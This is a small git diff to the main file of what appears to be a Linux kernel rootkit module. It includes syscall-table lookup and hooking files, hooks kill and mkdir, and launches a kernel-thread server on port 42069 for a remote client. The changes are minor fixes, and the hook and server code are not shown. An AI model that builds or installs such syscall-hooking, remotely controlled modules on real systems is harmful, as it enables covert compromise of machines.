@@ -6,12 +6,12 @@ kernel module imports
 #include <linux/kernel.h> //contains types, macros, functions for the kernel   e.g. KERN_INFO
 #include <linux/string.h>
 
-#include "custom/client_interface.c"
+static int BUFFER_SIZE = 2048; //size of buffers used
+
+#include "custom/networking.c" //functions to run server and communicate with client
 #include "custom/syscall_table.c" //functions for getting sycall syscall_table
 #include "custom/hooks.c" //functions for hooking syscalls
 #include "custom/hooked_syscalls.c" //functions of the hooked syscalls
-
-static int BUFFER_SIZE 2048; //size of buffers used
 
 static void __exit ModuleExit(void) {
 	remove_hook(&sys_kill); //removes sys_kill hook
@@ -32,8 +32,7 @@ static int __init ModuleInit(void) {
 	orig_mkdir = sys_mkdir.orig_syscall; //sets orig_mkdir to original syscall adress
 	//orig_execve = sys_execve.orig_syscall; //sets orig_execve to original syscall adress
 
-	int port = 42069; //sets the port to set
-
+	unsigned short int port = 42069; //sets the port to set
 	kthread_run(run_server, (void *) port, "server"); //runs the server
 	return 0;
 }
